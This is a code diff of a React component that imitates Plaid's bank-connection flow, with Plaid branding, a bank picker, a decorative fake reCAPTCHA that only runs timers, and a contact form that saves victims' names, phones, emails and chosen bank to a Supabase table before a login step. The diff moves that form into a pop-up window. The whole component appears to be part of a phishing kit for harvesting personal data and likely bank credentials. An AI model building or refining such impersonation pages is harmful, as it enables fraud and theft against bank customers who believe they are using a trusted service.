@@ -1,7 +1,6 @@
 import { useState, useRef } from 'react'
 import LogoMark from '../components/LogoMark.jsx'
 import Icon from '../components/Icon.jsx'
-import { supabase } from '../lib/supabase.js'
 
 // Formatea el teléfono estilo US mientras se escribe: (201) 555 0123
 const fmtPhone = (v) => {
@@ -71,147 +70,29 @@ export default function PlaidConnect() {
   const capTimer = useRef(null)
   const close = () => window.close()
 
-  // Formulario de contacto
-  const [contactForm, setContactForm] = useState({ full_name: '', phone: '', email: '', note: '' })
-  const [submittingForm, setSubmittingForm] = useState(false)
 
   const q = query.trim().toLowerCase()
   const filtered = q ? BANKS.filter((b) => b.name.toLowerCase().includes(q)) : BANKS
 
   // Al elegir un banco → pantalla del reCAPTCHA.
   const pickBank = (b) => { setBank(b); setCaptchaState('idle'); setStep('captcha') }
-  // Guardar formulario de contacto y continuar al login
-  const submitContactForm = async (e) => {
-    e.preventDefault()
-    if (!contactForm.full_name || !contactForm.phone || !contactForm.email) return
-
-    setSubmittingForm(true)
-    const { error } = await supabase.from('contact_forms').insert({
-      full_name: contactForm.full_name,
-      phone: contactForm.phone,
-      email: contactForm.email,
-      note: contactForm.note || null,
-      institution: bank?.name || null,
-    })
-    setSubmittingForm(false)
-
-    if (error) {
-      alert('Error al guardar el formulario: ' + error.message)
-      return
-    }
-
-    // Continuar al login
-    setStep('login')
-  }
-
-  // Marcar el check: spinner → check verde → avanza al formulario de contacto.
+  // Marcar el check: spinner → check verde → abre ContactForm en nueva ventana.
   const checkCaptcha = () => {
     if (captchaState !== 'idle') return
     setCaptchaState('checking')
     clearTimeout(capTimer.current)
     capTimer.current = setTimeout(() => {
       setCaptchaState('done')
-      capTimer.current = setTimeout(() => { setContactForm({ full_name: '', phone: '', email: '', note: '' }); setStep('contact-form') }, 700)
+      capTimer.current = setTimeout(() => {
+        // Abrir ContactForm en nueva ventana
+        window.open('/contact-form', '_blank', 'width=600,height=700,noopener')
+        // Cerrar esta ventana después de un momento
+        setTimeout(() => window.close(), 1000)
+      }, 700)
     }, 1200)
   }
 
-  // ---- Paso 3: Formulario de contacto ----
-  if (step === 'contact-form') {
-    const bankName = bank?.name || 'your institution'
-    return (
-      <div className="flex min-h-screen items-start justify-center bg-bg-neutral px-4 py-10">
-        <div className="flex min-h-[640px] w-full max-w-[400px] flex-col rounded-2xl bg-white px-6 pt-5 pb-6 shadow-xl">
-          {/* Header PLAID + progreso */}
-          <div className="relative flex items-center justify-center">
-            <span className="flex items-center gap-1.5 text-content-primary">
-              <PlaidKnot size={18} stroke={2} />
-              <span className="text-sm font-extrabold tracking-wide">PLAID</span>
-            </span>
-            <button onClick={close} aria-label="Close" className="absolute right-0 text-content-primary hover:text-content-secondary">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12" /></svg>
-            </button>
-          </div>
-          <div className="mt-4 flex gap-1.5">
-            <span className="h-1 flex-1 rounded-full bg-[#00b8d9]" />
-            <span className="h-1 flex-1 rounded-full bg-[#00b8d9]" />
-            <span className="h-1 flex-1 rounded-full bg-[#00b8d9]" />
-            <span className="h-1 flex-1 rounded-full bg-gradient-to-r from-[#00b8d9] to-[#00b8d9]/20" />
-          </div>
-
-          <h1 className="mb-2 mt-8 text-center text-2xl font-bold leading-snug text-content-primary">Contact Information</h1>
-          <p className="mb-6 text-center text-sm text-content-secondary">Please provide your contact details for {bankName}</p>
-
-          <form onSubmit={submitContactForm} className="flex flex-1 flex-col space-y-4">
-            <div>
-              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Full name</label>
-              <input
-                type="text"
-                required
-                value={contactForm.full_name}
-                onChange={(e) => setContactForm({ ...contactForm, full_name: e.target.value })}
-                placeholder="John Doe"
-                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
-              />
-            </div>
-
-            <div>
-              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Phone</label>
-              <input
-                type="tel"
-                required
-                value={contactForm.phone}
-                onChange={(e) => setContactForm({ ...contactForm, phone: e.target.value })}
-                placeholder="(201) 555 0123"
-                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
-              />
-            </div>
-
-            <div>
-              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Email</label>
-              <input
-                type="email"
-                required
-                value={contactForm.email}
-                onChange={(e) => setContactForm({ ...contactForm, email: e.target.value })}
-                placeholder="john@example.com"
-                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
-              />
-            </div>
-
-            <div>
-              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Notes (optional)</label>
-              <textarea
-                value={contactForm.note}
-                onChange={(e) => setContactForm({ ...contactForm, note: e.target.value })}
-                placeholder="Any additional information..."
-                rows={3}
-                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary resize-none"
-              />
-            </div>
-
-            <div className="mt-auto pt-4">
-              <button
-                type="button"
-                onClick={() => setStep('captcha')}
-                className="mb-3 w-full rounded-full border border-black/15 py-3.5 font-bold text-content-primary hover:border-content-primary"
-              >
-                Back
-              </button>
-              <button
-                type="submit"
-                disabled={submittingForm}
-                className="w-full rounded-full bg-black py-3.5 font-bold text-white hover:bg-black/90 disabled:opacity-60"
-              >
-                {submittingForm ? 'Submitting…' : 'Continue'}
-              </button>
-            </div>
-          </form>
-        </div>
-      </div>
-    )
-  }
-
-  // ---- Paso 4: reCAPTCHA ----
+  // ---- Paso 3: reCAPTCHA ----
   if (step === 'captcha') {
     return (
       <div className="flex min-h-screen items-start justify-center bg-bg-neutral px-4 py-10">
